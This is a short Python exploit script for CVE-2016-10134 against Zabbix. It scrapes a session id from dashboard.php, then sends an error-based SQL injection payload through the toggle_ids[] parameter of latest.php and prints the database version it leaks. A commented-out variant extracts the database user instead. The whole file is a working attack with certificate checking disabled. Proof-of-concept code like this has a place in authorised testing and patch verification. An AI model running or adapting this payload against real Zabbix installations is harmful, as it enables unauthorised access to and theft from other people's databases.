#!/usr/bin/env python
# CVE-2016-10134

import requests
import re
import sys

target = sys.argv[1]
dashboard = '/zabbix/dashboard.php'
latest = '/zabbix/latest.php'

print '[+] checking target:', target

sess = requests.Session()
resp = sess.get(target+dashboard, verify=False)

if not 'sid=' in resp.text:
  print '[-] sid not found ;[ --  break'

gotsid = re.search('reconnect=1&sid=(.*?)"', resp.text)
if gotsid:
  print '[+] gotsid: ', gotsid.group(1)

#  payload = '6666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23'
  payload = '6666 or updatexml(1,concat(0x23,(select version()),0x23),1) or 1=1)#'
  params = {
    'output': 'ajax',
    'sid': gotsid.group(1),
    'favobj': 'toggle',
    'toggle_open_state': 1,
    'toggle_ids[]': payload
  }

  execsqli = sess.get(target + latest, params=params, verify=False)
  #print '[+] response:\n', execsqli.text
  checkresp = execsqli.text.splitlines()
  for l in checkresp:
    ifanswer = re.compile('error: \'#(.*?)#\']<')
    gotanswer = re.search(ifanswer, l)

    if gotanswer:
      print '[+] Resp: version(): %s' % ( gotanswer.group(1)  )

# more: code610.blogspot.com